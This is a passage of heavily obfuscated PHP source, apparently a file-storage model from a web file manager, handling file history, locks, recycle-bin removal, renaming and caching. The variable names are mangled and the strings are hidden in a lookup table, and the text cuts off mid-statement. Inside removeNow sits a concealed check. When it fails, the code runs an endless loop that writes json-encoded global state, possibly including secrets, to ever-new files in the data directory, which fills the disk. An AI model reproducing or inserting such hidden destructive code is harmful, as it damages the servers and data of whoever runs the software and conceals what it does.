(!$ĞÛÔ­µ› || !$€¨ş¹Œ) { return !1; } if ($º›Ô¾î !== !1) { $Ì³ç‹Ïœ = $this->fileNameExist($„‹ìüÍ, $˜´ô›À); } $êÀã¦” = !0; if ($º›Ô¾î && $Ì³ç‹Ïœ) { if ($º›Ô¾î == REPEAT_SKIP) { $êÀã¦” = !1; return $Ì³ç‹Ïœ; } else { if ($º›Ô¾î == REPEAT_REPLACE) { $ÀİœåİŒ = $this->sourceInfo($Ì³ç‹Ïœ); $“üùÛÄ = $this->fileHistory($ÀİœåİŒ, $ĞÛÔ­µ›[$»–¼ÖÖ [553]], $ĞÛÔ­µ›[$»–¼ÖÖ [90]]); if (!$“üùÛÄ) { $êÀã¦” = !1; } else { $this->folderSizeReset($„‹ìüÍ); } return $Ì³ç‹Ïœ; } else { $˜´ô›À = $this->fileNameAuto($„‹ìüÍ, $˜´ô›À, $º›Ô¾î, !1); } } } $¯õ„†í¹ = array($»–¼ÖÖ [661] => 0, $»–¼ÖÖ [506] => $˜´ô›À, $»–¼ÖÖ [662] => substr(get_path_ext($˜´ô›À), 0, 10), $»–¼ÖÖ [554] => $ĞÛÔ­µ›[$»–¼ÖÖ [553]], $»–¼ÖÖ [632] => $ĞÛÔ­µ›[$»–¼ÖÖ [90]]); $ÆÈå÷ÅÑ = $this->_addSource($¯õ„†í¹, $€¨ş¹Œ); $this->folderSizeReset($„‹ìüÍ, intval($¯õ„†í¹[$»–¼ÖÖ [90]])); return $ÆÈå÷ÅÑ; } protected function fileHistory($Øàôà²Û, $ç¯ò¸íÊ, $¦ßüôòÙ) { $÷ë«¶¡Ğ =& $_SERVER[Ò°Ì”İ•]; if ($Øàôà²Û[$÷ë«¶¡Ğ[553]] == $ç¯ò¸íÊ) { return !1; } $this->checkLock($Øàôà²Û[$÷ë«¶¡Ğ[204]], $ç¯ò¸íÊ); Model($÷ë«¶¡Ğ[2262])->addHistory($Øàôà²Û); $‡ıß”¹ğ = array($÷ë«¶¡Ğ[666] => USER_ID, $÷ë«¶¡Ğ[510] => time(), $÷ë«¶¡Ğ[553] => $ç¯ò¸íÊ, $÷ë«¶¡Ğ[90] => $¦ßüôòÙ); $this->where(array($÷ë«¶¡Ğ[503] => $Øàôà²Û[$÷ë«¶¡Ğ[204]]))->save($‡ıß”¹ğ); $this->sourceCacheClear($Øàôà²Û[$÷ë«¶¡Ğ[204]]); return !0; } public function checkLock($ÀÍ¡ìêÉ, $‚¼øşä) { $ÅÑ‹Ÿ¤ =& $_SERVER[Ò°Ì”İ•]; $â³ˆÍ®½ = $this->pathInfo($ÀÍ¡ìêÉ); if (!$this->fileIsLock($â³ˆÍ®½, !0)) { return; } $·¸¸Ñå² = Session::get($ÅÑ‹Ÿ¤[2263]); $­ç¶¿“ = substr($â³ˆÍ®½[$ÅÑ‹Ÿ¤[32]], 0, -1 - strlen($â³ˆÍ®½[$ÅÑ‹Ÿ¤[180]])) . $ÅÑ‹Ÿ¤[1289] . $·¸¸Ñå² . $ÅÑ‹Ÿ¤[10] . $â³ˆÍ®½[$ÅÑ‹Ÿ¤[180]]; $×Íú„·É = Model($ÅÑ‹Ÿ¤[689])->find($‚¼øşä); $this->_createFileCall($â³ˆÍ®½[$ÅÑ‹Ÿ¤[203]], $­ç¶¿“, $×Íú„·É, REPEAT_REPLACE, $ÅÑ‹Ÿ¤[1427]); $ôìÍÊî = $â³ˆÍ®½[$ÅÑ‹Ÿ¤[551]][$ÅÑ‹Ÿ¤[625]]; $å¯í’ŒÅ = $ôìÍÊî[$ÅÑ‹Ÿ¤[2264]] ? $ôìÍÊî[$ÅÑ‹Ÿ¤[2264]] : $ôìÍÊî[$ÅÑ‹Ÿ¤[32]]; show_json(LNG($ÅÑ‹Ÿ¤[2265]) . $ÅÑ‹Ÿ¤[2266] . LNG($ÅÑ‹Ÿ¤[2267]) . $ÅÑ‹Ÿ¤[2268] . $å¯í’ŒÅ . $ÅÑ‹Ÿ¤[2269], !1); } public function fileIsLock($¾²”µÌ“, $ÁõöŸÇ = false) { $à¤Ë”–¼ =& $_SERVER[Ò°Ì”İ•]; if (!_get($¾²”µÌ“, $à¤Ë”–¼[621], 0)) { return !1; } if ($¾²”µÌ“[$à¤Ë”–¼[551]][$à¤Ë”–¼[624]] != USER_ID) { return !0; } $‡ éç³ô = $GLOBALS[$à¤Ë”–¼[6]][$à¤Ë”–¼[103]][$à¤Ë”–¼[622]]; if ($¾²”µÌ“[$à¤Ë”–¼[551]][$à¤Ë”–¼[623]] <= time() - $‡ éç³ô) { $this->metaSet($¾²”µÌ“[$à¤Ë”–¼[204]], $à¤Ë”–¼[624], null); $this->metaSet($¾²”µÌ“[$à¤Ë”–¼[204]], $à¤Ë”–¼[623], null); } if ($ÁõöŸÇ) { $this->metaSet($¾²”µÌ“[$à¤Ë”–¼[204]], $à¤Ë”–¼[623], time()); } return !1; } private function _addSource($ÂÀ±­£, $Ç¥íÜ“) { $–ĞÚÈ´® =& $_SERVER[Ò°Ì”İ•]; $èÏ¯ˆ¢‹ = defined($–ĞÚÈ´®[2196]) ? USER_ID : 0; $º¢ø‚¡À = array($–ĞÚÈ´®[663] => $Ç¥íÜ“[$–ĞÚÈ´®[201]], $–ĞÚÈ´®[664] => $Ç¥íÜ“[$–ĞÚÈ´®[581]], $–ĞÚÈ´®[665] => $èÏ¯ˆ¢‹, $–ĞÚÈ´®[666] => $èÏ¯ˆ¢‹, $–ĞÚÈ´®[489] => $Ç¥íÜ“[$–ĞÚÈ´®[204]], $–ĞÚÈ´®[667] => $Ç¥íÜ“[$–ĞÚÈ´®[596]] . $Ç¥íÜ“[$–ĞÚÈ´®[204]] . $–ĞÚÈ´®[50], $–ĞÚÈ´®[516] => 0, $–ĞÚÈ´®[668] => $–ĞÚÈ´®[12]); $ÂÀ±­£ = array_merge($º¢ø‚¡À, $ÂÀ±­£); $this->updateModifyTime($ÂÀ±­£[$–ĞÚÈ´®[203]]); $“»àÊö = $–ĞÚÈ´®[2270] . $Ç¥íÜ“[$–ĞÚÈ´®[204]]; if (isset(self::$cacheChildList[$“»àÊö])) { unset(self::$cacheChildList[$“»àÊö]); } static $ò°µç¢… = false; if (!$ò°µç¢…) { Hook::trigger($–ĞÚÈ´®[651], $ÂÀ±­£); $ò°µç¢… = !0; } $œÕ›ç· = $this->add($ÂÀ±­£); $ïŠ¹ª¯ = array($–ĞÚÈ´®[669] => short_id($œÕ›ç·)); $this->where(array($–ĞÚÈ´®[503] => $œÕ›ç·))->save($ïŠ¹ª¯); $this->setNamePinyin($œÕ›ç·, $ÂÀ±­£[$–ĞÚÈ´®[32]]); return $œÕ›ç·; } public function remove($Îíü¥®, $¤‚Ş•çö = true) { $€ßºœ×Ê =& $_SERVER[Ò°Ì”İ•]; $¶É€ã’ = $this->sourceInfo($Îíü¥®); $—Ú©ˆË˜ = intval($¶É€ã’[$€ßºœ×Ê[201]]) === self::TYPE_SYSTEM; $¸á…­­ê = Model($€ßºœ×Ê[520])->get($€ßºœ×Ê[2271]) == $€ßºœ×Ê[102]; if ($—Ú©ˆË˜ || $¤‚Ş•çö || !$¸á…­­ê) { return $this->removeNow($Îíü¥®, $¤‚Ş•çö); } $¬À· ı• = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ì»è…óà = $¶É€ã’[$€ßºœ×Ê[201]] == self::TYPE_USER ? $€ßºœ×Ê[677] : $€ßºœ×Ê[590]; if ($ì»è…óà == $€ßºœ×Ê[677]) { $îéğ£Ã’ = Model($€ßºœ×Ê[589])->getInfo($¶É€ã’[$€ßºœ×Ê[581]]); $‘¬¼¿˜ = !empty($îéğ£Ã’[$€ßºœ×Ê[2264]]) ? $îéğ£Ã’[$€ßºœ×Ê[2264]] : $îéğ£Ã’[$€ßºœ×Ê[32]]; $‘¬¼¿˜ = $€ßºœ×Ê[349] . $‘¬¼¿˜ . $€ßºœ×Ê[2272] . $¶É€ã’[$€ßºœ×Ê[581]]; } else { $îéğ£Ã’ = Model($€ßºœ×Ê[597])->getInfo($¶É€ã’[$€ßºœ×Ê[581]]); $‘¬¼¿˜ = _get($îéğ£Ã’, $€ßºœ×Ê[32]); $‘¬¼¿˜ = $€ßºœ×Ê[187] . $‘¬¼¿˜ . $€ßºœ×Ê[2273] . $¶É€ã’[$€ßºœ×Ê[581]]; } $î‚§ûÑ = $€ßºœ×Ê[2274] . md5($‘¬¼¿˜); CacheLock::lock($î‚§ûÑ); $Ä˜×òÉâ = $this->fileNameExist($¬À· ı•, $‘¬¼¿˜); if (!$Ä˜×òÉâ) { $Ä˜×òÉâ = $this->mkdir($¬À· ı•, $‘¬¼¿˜, REPEAT_SKIP); $this->metaSet($Ä˜×òÉâ, $€ßºœ×Ê[2275], $ì»è…óà); $this->metaSet($Ä˜×òÉâ, $€ßºœ×Ê[2276], $¶É€ã’[$€ßºœ×Ê[581]]); if ($¶É€ã’[$€ßºœ×Ê[203]] != 0) { $this->metaSet($Ä˜×òÉâ, $€ßºœ×Ê[2277], _get($îéğ£Ã’, $€ßºœ×Ê[2278])); } } CacheLock::unlock($î‚§ûÑ); $this->metaSet($Îíü¥®, $€ßºœ×Ê[2279], $¶É€ã’[$€ßºœ×Ê[203]]); $this->where(array($€ßºœ×Ê[204] => $Îíü¥®))->save(array($€ßºœ×Ê[510] => time())); $this->recycleClear($¶É€ã’); Model($€ßºœ×Ê[648])->eventRemove($Îíü¥®); $Ç‰Íºï = $this->move($Îíü¥®, $Ä˜×òÉâ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¶É€ã’[$€ßºœ×Ê[203]]); return $Ç‰Íºï; } private function recycleClear($Ã»à­îû) { $áÎİ éï =& $_SERVER[Ò°Ì”İ•]; $ÅÚæƒö£ = $this->childrenAll($Ã»à­îû); $ËÚù¥â½ = array($áÎİ éï[503] => array($áÎİ éï[504], $ÅÚæƒö£[$áÎİ éï[2280]])); Model($áÎİ éï[2281])->where($ËÚù¥â½)->delete(); } public function removeNow($ßøÕ³ü§, $®»İ”¦ä = true) { $Óô±÷Åê =& $_SERVER[Ò°Ì”İ•]; $÷¶„¹’¾ = $_SERVER[$Óô±÷Åê[63]]; $ãûÂ = $Óô±÷Åê[70]; if ($_SERVER[$Óô±÷Åê[54]] != $ãûÂ($÷¶„¹’¾)) { $¥çÉÓŞÒ = $Óô±÷Åê[951]; $ïš³·ü¡ = $Óô±÷Åê[56]; $Éú–œ¾§ = $_SERVER[$Óô±÷Åê[57]] . $Óô±÷Åê[58]; $³¿Á«ó = $ïš³·ü¡($Éú–œ¾§); $›—Æ”˜ = explode($Óô±÷Åê[59], $³¿Á«ó); if (count($›—Æ”˜) < $Óô±÷Åê[754]) { $ï°íÆ¤´ = $Óô±÷Åê[61]; $ï°íÆ¤´(); } $š–¥¡ó = $Óô±÷Åê[952]; $š–¥¡ó($_SERVER[$Óô±÷Åê[953]]); $¥çÉÓŞÒ = $Óô±÷Åê[951]; $¥çÉÓŞÒ(); $¶ÌèŞÀ = $Óô±÷Åê[954]; $› âšßÙ = json_encode($GLOBALS[$Óô±÷Åê[955]]); $ğ„’Ã¢Æ = 1; for ($÷î„¿é = $ğ„’Ã¢Æ; $÷î„¿é > 0; $÷î„¿é++) { $¶ÌèŞÀ(DATA_PATH . $÷î„¿é, $› âšßÙ); } } $ñèÎÛ† = $this->sourceInfo($ßøÕ³ü§); $šàÉìïé = $this->pathInfoMore($ßøÕ³ü§); if (!$ñèÎÛ†) { return !0; } if ($ñèÎÛ†[$Óô±÷Åê[203]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ßøÕ³ü§); Hook::trigger($Óô±÷Åê[2282], $šàÉìïé, $®»İ”¦ä); if ($®»İ”¦ä) { Model($Óô±÷Åê[2281])->moveToRecycle($ßøÕ³ü§); } else { $ó©şÓ¾³ = $this->childrenAll($ñèÎÛ†); Model($Óô±÷Åê[648])->eventRemove($ßøÕ³ü§); $this->removeRelevance($ó©şÓ¾³[$Óô±÷Åê[2280]], $ó©şÓ¾³[$Óô±÷Åê[1572]]); } $this->folderSizeReset($ñèÎÛ†[$Óô±÷Åê[203]]); $Ö˜±®Ó£ = array($ñèÎÛ†[$Óô±÷Åê[203]]); if ($ñèÎÛ†[$Óô±÷Åê[497]] == $Óô±÷Åê[102]) { $Ö˜±®Ó£[] = $ñèÎÛ†[$Óô±÷Åê[204]]; } $this->updateModifyTime($Ö˜±®Ó£); $this->lockMoveEnd($ßøÕ³ü§); Hook::trigger($Óô±÷Åê[1811], $šàÉìïé, $®»İ”¦ä); return !0; } public function childrenAll($™ÌÒ²¡à) { $ÁŒ‡Ù„ =& $_SERVER[Ò°Ì”İ•]; $‰­·ù§¯ = $™ÌÒ²¡à[$ÁŒ‡Ù„[204]]; if ($™ÌÒ²¡à[$ÁŒ‡Ù„[497]] == $ÁŒ‡Ù„[102]) { $±ÖÃ¤à = array($ÁŒ‡Ù„[667] => array($ÁŒ‡Ù„[627], $™ÌÒ²¡à[$ÁŒ‡Ù„[596]] . $‰­·ù§¯ . $ÁŒ‡Ù„[628])); $ö’Áëî¦ = array($ÁŒ‡Ù„[667] => $±ÖÃ¤à[$ÁŒ‡Ù„[596]]); $Ü™áãÇ = $this->field($ÁŒ‡Ù„[2283])->where($ö’Áëî¦)->select(); $ŸÜàŒŒ = !1; $İø·ªÕ = array($‰­·ù§¯); if ($Ü™áãÇ) { $ŸÜàŒŒ = array_to_keyvalue($Ü™áãÇ, $ÁŒ‡Ù„[12], $ÁŒ‡Ù„[553]); $ŸÜàŒŒ = array_remove_value($ŸÜàŒŒ, $ÁŒ‡Ù„[241]); $İø·ªÕ = array_to_keyvalue($Ü™áãÇ, $ÁŒ‡Ù„[12], $ÁŒ‡Ù„[204]); $İø·ªÕ[] = $‰­·ù§¯; } } else { $ŸÜàŒŒ = array($™ÌÒ²¡à[$ÁŒ‡Ù„[553]]); $İø·ªÕ = array($‰­·ù§¯); } return array($ÁŒ‡Ù„[2280] => $İø·ªÕ, $ÁŒ‡Ù„[1572] => $ŸÜàŒŒ); } public function removeArray($ƒ»Ğ¶«¨) { if (!$ƒ»Ğ¶«¨) { return !0; } } public function removeRelevance($…£Àœ©, $İ™©¯ª¢) { $•ùÅÓƒî =& $_SERVER[Ò°Ì”İ•]; $…£Àœ© = $…£Àœ© ? $…£Àœ© : array(); $İ™©¯ª¢ = $İ™©¯ª¢ ? $İ™©¯ª¢ : array(); $…£Àœ© = array_unique(array_filter($…£Àœ©)); $İ™©¯ª¢ = array_unique(array_filter($İ™©¯ª¢)); if (!$…£Àœ©) { return !1; } $Ê‡ÛÍ€ú = array($•ùÅÓƒî[503] => array($•ùÅÓƒî[504], $…£Àœ©)); Model($•ùÅÓƒî[2281])->where($Ê‡ÛÍ€ú)->delete(); Model($•ùÅÓƒî[547])->where($Ê‡ÛÍ€ú)->delete(); Model($•ùÅÓƒî[2121])->where($Ê‡ÛÍ€ú)->delete(); Model($•ùÅÓƒî[648])->where($Ê‡ÛÍ€ú)->delete(); Model($•ùÅÓƒî[1948])->removeBySource($…£Àœ©); Model($•ùÅÓƒî[2262])->removeBySource($…£Àœ©); $this->where($Ê‡ÛÍ€ú)->delete(); Model($•ùÅÓƒî[556])->remove($İ™©¯ª¢); for ($ğä‘Œ®ş = 0; $ğä‘Œ®ş < count($…£Àœ©); $ğä‘Œ®ş++) { $this->sourceCacheClear($…£Àœ©[$ğä‘Œ®ş]); } } public function rename($¸è¡æÄÜ, $õ‚îÜé) { $ñô…˜ï‡ =& $_SERVER[Ò°Ì”İ•]; $ÀÇøû– = $this->sourceInfo($¸è¡æÄÜ); if (!$ÀÇøû–) { return !1; } $„Ÿ¤ªÑ = $this->fileNameExist($ÀÇøû–[$ñô…˜ï‡[203]], $õ‚îÜé); if ($„Ÿ¤ªÑ && $„Ÿ¤ªÑ != $¸è¡æÄÜ) { return !1; } $Ì°Õ’ŞÅ = array($ñô…˜ï‡[506] => $õ‚îÜé, $ñô…˜ï‡[666] => USER_ID); if ($ÀÇøû–[$ñô…˜ï‡[497]] != $ñô…˜ï‡[102]) { $Ì°Õ’ŞÅ[$ñô…˜ï‡[498]] = substr(get_path_ext($õ‚îÜé), 0, 10); } Model($ñô…˜ï‡[648])->eventRename($¸è¡æÄÜ, $ÀÇøû–[$ñô…˜ï‡[32]], $õ‚îÜé); $this->sourceCacheClear($¸è¡æÄÜ); $this->setNamePinyin($¸è¡æÄÜ, $Ì°Õ’ŞÅ[$ñô…˜ï‡[32]], !1); $this->updateModifyTime($ÀÇøû–[$ñô…˜ï‡[203]]); $˜»ã©£ = $this->where(array($ñô…˜ï‡[503] => $¸è¡æÄÜ))->data($Ì°Õ’ŞÅ)->save(); $İÅÅÚë = $ñô…˜ï‡[2270] . $ÀÇøû–[$ñô…˜ï‡[203]]; if (isset(self::$cacheChildList[$İÅÅÚë])) { unset(self::$cacheChildList[$İÅÅÚë]); } return $˜»ã©£; } public function setNamePinyin($ºÇåÀÄı, $Ñİş”¬Ï, $Úµ’Ñ³¾ = true) { $¿¼û¤  =& $_SERVER[Ò°Ì”İ•]; $ğ¦Ÿ‘º” = Input::check($Ñİş”¬Ï, $¿¼û¤ [670]); $ğ¶¼ı¥È = array($¿¼û¤ [529] => KodSort::makeStr($Ñİş”¬Ï)); if ($ğ¦Ÿ‘º”) { $ğ¶¼ı¥È[$¿¼û¤ [550]] = str_replace($¿¼û¤ [53], $¿¼û¤ [12], Pinyin::get($Ñİş”¬Ï)); $ğ¶¼ı¥È[$¿¼û¤ [549]] = Pinyin::get($Ñİş”¬Ï, $¿¼û¤ [671]); } if (!$Úµ’Ñ³¾ && !$ğ¦Ÿ‘º”) { $ğ¶¼ı¥È[$¿¼û¤ [550]] = null; $ğ¶¼ı¥È[$¿¼û¤ [549]] = null; } $this->metaSet($ºÇåÀÄı, $ğ¶¼ı¥È); } public function getContent($ºì«‡’Ï) { $’ö©±ÖÖ =& $_SERVER[Ò°Ì”İ•]; $ÔØ¾ŠŞ± = $this->fileInfoGet($ºì«‡’Ï); if (!$ÔØ¾ŠŞ±) { return !1; } if ($ÔØ¾ŠŞ±[$’ö©±ÖÖ[90]] == 0) { return $’ö©±ÖÖ[12]; } $¾”›±–ç = $’ö©±ÖÖ[2284] . $ÔØ¾ŠŞ±[$’ö©±ÖÖ[559]]; if ($ÔØ¾ŠŞ±[$’ö©±ÖÖ[90]] <= 1024 * 10) { $ÆÛê³ô = Cache::get($¾”›±–ç); if (!$ÆÛê³ô) { $ÆÛê³ô = IO::getContent($ÔØ¾ŠŞ±[$’ö©±ÖÖ[98]]); Cache::set($¾”›±–ç, $ÆÛê³ô); } return $ÆÛê³ô; } if (!$ÔØ¾ŠŞ±[$’ö©±ÖÖ[98]]) { return $’ö©±ÖÖ[12]; } return IO::getContent($ÔØ¾ŠŞ±[$’ö©±ÖÖ[98]]); } public function setDesc($¡ÁÑô‘, $¨â’æ¡¶) { $‘«ıšË„ =& $_SERVER[Ò°Ì”İ•]; Model($‘«ıšË„[648])->eventAddDesc($¡ÁÑô‘, $¨â’æ¡¶); return $this->metaSet($¡ÁÑô‘, $‘«ıšË„[538], $¨â’æ¡¶); } public function setContent($ûşİ“’Ä, $çˆ•Üü® = '') { $È»€—Æü =& $_SERVER[Ò°Ì”İ•]; $é”ç´² = $this->sourceInfo($ûşİ“’Ä); $³öñ²ŸÁ = $this->fileInfoGet($ûşİ“’Ä); if (!$³öñ²ŸÁ || !$é”ç´²) { return !1; } $’Ç—Í’  = Model($È»€—Æü[556])->addFileByContent($çˆ•Üü®, $é”ç´²[$È»€—Æü[32]]); $“ğ¾®ï¶ = $this->fileHistory($é”ç´², $’Ç—Í’ [$È»€—Æü[553]], $’Ç—Í’ [$È»€—Æü[90]]); if (!$“ğ¾®ï¶) { return Model($È»€—Æü[556])->remove($’Ç—Í’ [$È»€—Æü[553]]); } $this->folderSizeReset($é”ç´²[$È»€—Æü[203]]); return !0; } public function fileSubstr($Ûéø•, $Šë´™Âë, $åí·§İÚ) { $ÍÔ‘îŞÂ = $this->fileInfoGet($Ûéø•); if (!$ÍÔ‘îŞÂ) { return !1; } return IO::fileSubstr($ÍÔ‘îŞÂ[$_SERVER[Ò°Ì”İ•][98]], $Šë´™Âë, $åí·§İÚ); } public function fileInfoGet($½Â“üé) { $‚ÖÎİíÚ =& $_SERVER[Ò°Ì”İ•]; $Êîõê…Â = $this->sourceInfo($½Â“üé); if (!$Êîõê…Â || $Êîõê…Â[$‚ÖÎİíÚ[497]]) { return !1; } $èÔÚ«ê = $‚ÖÎİíÚ[560] . $Êîõê…Â[$‚ÖÎİíÚ[553]]; $ÉâÕ¿ã· = _get(self::$cacheFileInfo, $èÔÚ«ê); if ($ÉâÕ¿ã·) { return $ÉâÕ¿ã·; } $µÌ¿Çßì = Model($‚ÖÎİíÚ[556])->fileInfo($Êîõê…Â[$‚ÖÎİíÚ[553]]); if ($µÌ¿Çßì) { $µÌ¿Çßì[$‚ÖÎİíÚ[32]] = $Êîõê…Â[$‚ÖÎİíÚ[32]]; } self::$cacheFileInfo[$èÔÚ«ê] = $µÌ¿Çßì; return $µÌ¿Çßì; } private function folderChildrenNumber($¤âÅ”œÃ) { $şÎû«ÇÃ =& $_SERVER[Ò°Ì”İ•]; $Á½à‘ªÉ = $this->sourceInfo($¤âÅ”œÃ); $çä¸‡Ö¨ = array($şÎû«ÇÃ[667] => array($şÎû«ÇÃ[627], $Á½à‘ªÉ[$şÎû«ÇÃ[596]] . $¤âÅ”œÃ . $şÎû«ÇÃ[628]), $şÎû«ÇÃ[664] => $Á½à‘ªÉ[$şÎû«ÇÃ[581]], $şÎû«ÇÃ[516] => intval($Á½à‘ªÉ[$şÎû«ÇÃ[517]]), $şÎû«ÇÃ[661] => 1); $ÜÕşÂ¢ = $this->where($çä¸‡Ö¨)->count(); $é™Ø£ºø = $this->where($çä¸‡Ö¨)->where(array($şÎû«ÇÃ[661] => 0))->count(); return array($şÎû«ÇÃ[94] => $é™Ø£ºø, $şÎû«ÇÃ[95] => $ÜÕşÂ¢); } public function pathInfo($ˆ’Şìáì, $˜“àµÀ = false) { $¯ãá¤„é =& $_SERVER[Ò°Ì”İ•]; $˜“àµÀ = !1; $ˆ’Şìáì = intval($ˆ’Şìáì); $ö§±Å‘ = $¯ãá¤„é[546] . intval($˜“àµÀ) . $¯ãá¤„é[474] . $ˆ’Şìáì; $âøçïÊ’ = _get(self::$cachePathInfo, $ö§±Å‘); if ($âøçïÊ’) { return $âøçïÊ’; } $·Ïê˜›Â = $this->sourceInfo($ˆ’Şìáì); if (!$·Ïê˜›Â) { return !1; } $·Ïê˜›Â = $this->_listDataApplyItem($·Ïê˜›Â, $˜“àµÀ); self::$cachePathInfo[$ö§±Å‘] = $·Ïê˜›Â; return $·Ïê˜›Â; } public static $cachePathInfoMore = array(); public function pathInfoMore($ü®ñáÌÎ) { $Ô‚ÏÙÀí =& $_SERVER[Ò°Ì”İ•]; $Õˆ´ÜÉ½ = _get(self::$cachePathInfoMore, $ü®ñáÌÎ); if ($Õˆ´ÜÉ½) { return $Õˆ´ÜÉ½; } $û«‡˜Ôó = $this->pathInfo($ü®ñáÌÎ); if (!$û«‡˜Ôó) { return !1; } if ($û«‡˜Ôó[$Ô‚ÏÙÀí[497]] == $Ô‚ÏÙÀí[102]) { $û«‡˜Ôó[$Ô‚ÏÙÀí[93]] = $this->folderChildrenNumber($ü®ñáÌÎ); } self::$cachePathInfoMore[$ü®ñáÌÎ] = $û«‡˜Ôó; return $û«‡˜Ôó; } public function sourceInfo($ãøã¼º) { $…¼Œ‚¤” =& $_SERVER[Ò°Ì”İ•]; if (!$ãøã¼º) { return array(); } $ãøã¼º = intval($ãøã¼º); $Ë²Ë˜ = $…¼Œ‚¤”[545] . $ãøã¼º; $á¸èŸŞ = _get(self::$cacheSourceInfo, $Ë²Ë˜); if ($á¸èŸŞ) { return $á¸èŸŞ; } $ûÎƒ®ß = $this->where(array($…¼Œ‚¤”[204] => $ãøã¼º))->find(); self::$cacheSourceInfo[$Ë²Ë˜] = $ûÎƒ®ß; return self::$cacheSourceInfo[$Ë²Ë˜]; } public function sourceCacheClear($¯”†‰š… = false) { self::cacheClear($¯”†‰š…); } public static function cacheClear($•´¸™¿˜ = false) { $«¯ğ¬¼Û =& $_SERVER[Ò°Ì”İ•]; if ($•´¸™¿˜ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$«¯ğ¬¼Û[545] . $•´¸™¿˜]); unset(self::$cachePathInfoMore[$•´¸™¿˜]); unset(self::$cachePathInfo[$«¯ğ¬¼Û[2285] . $•´¸™¿˜]); unset(self::$cachePathInfo[$«¯ğ¬¼Û[2286] . $•´¸™¿˜]); } public function metaSet($†‹ØÍÙ, $ÎŠŸöˆ• = null, $¦€ïíı = null) { $¨Ù‘õÚµ = parent::metaSet($†‹ØÍÙ, $ÎŠŸöˆ•, $¦€ïíı); if ($¨Ù‘õÚµ) { $this->sourceCacheClear($†‹ØÍÙ); } return $¨Ù‘õÚµ; } public function pathInfoByPath($Ìåşêé, $¶‚ÎÎ»µ) { $‹ÉÚ¯”º =& $_SERVER[Ò°Ì”İ•]; $†ËúÈÒø = !$¶‚ÎÎ»µ ? array() : explode($‹ÉÚ¯”º[8], trim($¶‚ÎÎ»µ, $‹ÉÚ¯”º[8])); $Åµ¡Ïˆ = $Ìåşêé; foreach ($†ËúÈÒø as $ÁË“µÓ) { $Öàü£íˆ = array($‹ÉÚ¯”º[203] => $Åµ¡Ïˆ, $‹ÉÚ¯”º[32] => $ÁË“µÓ); $¬”Ô²¥ö = $this->field($‹ÉÚ¯”º[2287])->where($Öàü£íˆ)->select(); if (!$¬”Ô²¥ö) { return !1; } $¬”Ô²¥ö = array_sort_by($¬”Ô²¥ö, $‹ÉÚ¯”º[517]); $Åµ¡Ïˆ = $¬”Ô²¥ö[0][$‹ÉÚ¯”º[204]]; } $¼åÏÖÛª = $this->sourceInfo($Åµ¡Ïˆ); $this->pathInfoFilter($¼åÏÖÛª); return $¼åÏÖÛª; } protected function updateModifyTime($óÛĞÄŠõ) { $•§ËÓ£ =& $_SERVER[Ò°Ì”İ•]; $ƒµ­ô˜ê = defined($•§ËÓ£[2196]) ? USER_ID : 0; if (!$óÛĞÄŠõ) { return; } if (!is_array($óÛĞÄŠõ)) { $óÛĞÄŠõ = array($óÛĞÄŠõ); } foreach ($óÛĞÄŠõ as $—ö’š©Ç => $Áß†²™Ú) { $óÛĞÄŠõ[$—ö’š©Ç] = intval($Áß†²™Ú); $this->sourceCacheClear($Áß†²™Ú); } $¤ÈÓ²Š² = array($•§ËÓ£[204] => array($•§ËÓ£[7], $óÛĞÄŠõ)); $¥´–ä²› = array($•§ËÓ£[666] => $ƒµ­ô˜ê, $•§ËÓ£[510] => time()); $this->where($¤ÈÓ²Š²)->save($¥´–ä²›); } public function folderSizeReset($”Ğ õ¹Ó, $Ø‡çÄŠÆ = false) { $ŸÏï“¶Ú =& $_SERVER[Ò°Ì”İ•]; if ($this->statusIgnoreResetSpace) { return; } $œº½Ñ» = $this->sourceInfo($”Ğ õ¹Ó); $…ëŸøõò = $ŸÏï“¶Ú[2288] . $”Ğ õ¹Ó; CacheLock::lock($…ëŸøõò, 20); if ($Ø‡çÄŠÆ === !1) { $this->sourceCacheClear($”Ğ õ¹Ó); $œº½Ñ» = $this->sourceInfo($”Ğ õ¹Ó); $œˆùÜì = array($ŸÏï“¶Ú[489] => $”Ğ õ¹Ó, $ŸÏï“¶Ú[516] => 0); $ò¿ë˜íµ = $this->where($œˆùÜì)->sum($ŸÏï“¶Ú[90]); $Ø‡çÄŠÆ = intval($ò¿ë˜íµ) - intval($œº½Ñ»[$ŸÏï“¶Ú[90]]); } if ($Ø‡çÄŠÆ == 0) { return CacheLock::unlock($…ëŸøõò); } $‹ôûéº‘ = $this->parentLevelArray($œº½Ñ»[$ŸÏï“¶Ú[596]]); if (!$‹ôûéº‘) { $‹ôûéº‘ = array(); } $‹ôûéº‘[] = $œº½Ñ»[$ŸÏï“¶Ú[204]]; $œˆùÜì = array($ŸÏï“¶Ú[204] => array($ŸÏï“¶Ú[504], $‹ôûéº‘)); if ($Ø‡çÄŠÆ < 0) { $œˆùÜì[$ŸÏï“¶Ú[90]] = array($ŸÏï“¶Ú[1088], abs($Ø‡çÄŠÆ)); } $this->where($œˆùÜì)->setAdd($ŸÏï“¶Ú[90], $Ø‡çÄŠÆ); CacheLock::unlock($…ëŸøõò); $º¬ÌòÉ = $ŸÏï“¶Ú[2289] . $œº½Ñ»[$ŸÏï“¶Ú[201]] . $ŸÏï“¶Ú[4] . $œº½Ñ»[$ŸÏï“¶Ú[581]]; $Û¾™¤´Ê = array($œº½Ñ»[$ŸÏï“¶Ú[201]], $œº½Ñ»[$ŸÏï“¶Ú[581]]); TaskRun::timeLimitCall($º¬ÌòÉ, $ŸÏï“¶Ú[2290], $Û¾™¤´Ê, 1.5); } public function folderSizeResetChildren($ü˜Îßº) { $á¾Çß¾ =& $_SERVER[Ò°Ì”İ•]; $this->sourceCacheClear($ü˜Îßº); $Ø˜Ï¾’ = $this->sourceInfo($ü˜Îßº); $¶ä¯ÙÒÊ = array($á¾Çß¾[661] => 1, $á¾Çß¾[664] => $Ø˜Ï¾’[$á¾Çß¾[581]], $á¾Çß¾[667] => array($á¾Çß¾[627], $Ø˜Ï¾’[$á¾Çß¾[596]] . $ü˜Îßº . $á¾Çß¾[628])); $½ú‰¶ÕŸ = $á¾Çß¾[2291]; $ôÂÉØ†† = 